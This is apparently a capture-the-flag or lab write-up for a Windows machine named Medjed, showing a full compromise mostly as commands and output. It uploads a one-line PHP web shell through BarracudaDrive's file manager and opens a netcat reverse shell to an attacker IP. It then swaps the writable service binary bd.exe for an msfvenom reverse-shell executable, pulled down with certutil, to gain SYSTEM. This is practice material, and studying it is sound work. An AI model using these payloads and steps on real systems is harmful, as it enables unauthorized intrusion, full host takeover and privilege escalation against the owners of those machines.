##### Tags: `bd`  `BarracudaDrive`  `xampp`  `icacls` `sq qc`

# 🪟 Medjed 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.174.127

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown
44330/tcp open  ssl/unknown
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
```
port 135,139,445 are rpc and smb but unable to connect  
port 3306 is MariaDB but default credential fail  
port 8000 is running BarracudaDrive v6.5  
create a new admin account and found there is a /fs directory  
we can read and upload file
```console
http://192.168.174.127:8000/fs/
```
there is a xampp service running is port 45332 and 45443  
so we will upload a cmd shell in the path C:/xampp/htdocs
```console
$ cat shell.php                  
<?php system($_REQUEST["cmd"]); ?>
```
confirmed we have RCE in port 45332
```console
http://192.168.174.127:45332/shell.php?cmd=whoami

medjed\jerren
```
upload nc.exe and get the shell back
```console
http://192.168.174.127:45332/shell.php?cmd=nc.exe -e cmd.exe 192.168.45.180 8000
```console
$ penelope -p 8000
[+] Listening for reverse shells on 0.0.0.0:8000 →  127.0.0.1 • 10.0.2.15 • 192.168.45.180
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from MEDJED 192.168.174.127 Microsoft_Windows_10_Pro-x64-based_PC 👤 medjed\jerren • Assigned SessionID <1>                                                                                                   
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/MEDJED~192.168.174.127-Microsoft_Windows_10_Pro-x64-based_PC/2026_03_30-17_26_05-655.log                                                                                               
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\xampp\htdocs>whoami

medjed\jerren
```
## Privilege Escalation
there is a Privilege escalation script from exploitdb  
https://www.exploit-db.com/exploits/48789  
since BarracudaDrive is running by root  
we confirmed we have write access to the file bd.exe
```console
C:\bd>icacls bd.exe
bd.exe BUILTIN\Administrators:(I)(F)
       NT AUTHORITY\SYSTEM:(I)(F)
       BUILTIN\Users:(I)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
```
bd is running as system
```console
C:\bd>sc qc bd
sc qc bd
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: bd
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\bd\bd.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : BarracudaDrive ( bd ) service
        DEPENDENCIES       : Tcpip
        SERVICE_START_NAME : LocalSystem
```
generate a revershell.exe name bd.exe
```console
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.180 lport=445 -f exe > bd.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
move the old one to another name
```console
C:\bd>move bd.exe bdd.exe
move bd.exe bdd.exe
        1 file(s) moved.
```
transfer the bd.exe to the victim
```console
C:\bd>certutil -urlcache -f http://192.168.45.180:80/bd.exe bd.exe
certutil -urlcache -f http://192.168.45.180:80/bd.exe bd.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
shutdown and restart the bd service
```console
C:\bd>shutdown /r
```
after 30 seconds we got the system shell back
```console
$ penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.180
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.174.127 WINDOWS 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.174.127-WINDOWS/2026_03_30-18_05_48-321.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami 
whoami 
nt authority\system
```
